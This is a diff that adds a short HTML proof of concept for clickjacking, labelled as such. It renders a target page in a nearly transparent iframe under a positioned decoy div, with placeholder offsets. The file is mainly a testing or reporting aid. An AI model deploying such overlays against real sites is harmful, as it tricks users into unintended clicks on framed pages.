@@ -1,0 +1,17 @@
+<style>
+    iframe {
+        position:relative;
+        width:1000px;
+        height: 700px;
+        opacity: 0.2;
+        z-index: 1;
+    }
+    div {
+        position:absolute;
+        top:$top_value;
+        left:$side_value;
+        z-index: 2;
+    }
+</style>
+<div>This is clickjacking POC</div>
+<iframe src="https://url.com/users/file?id=43"></iframe>
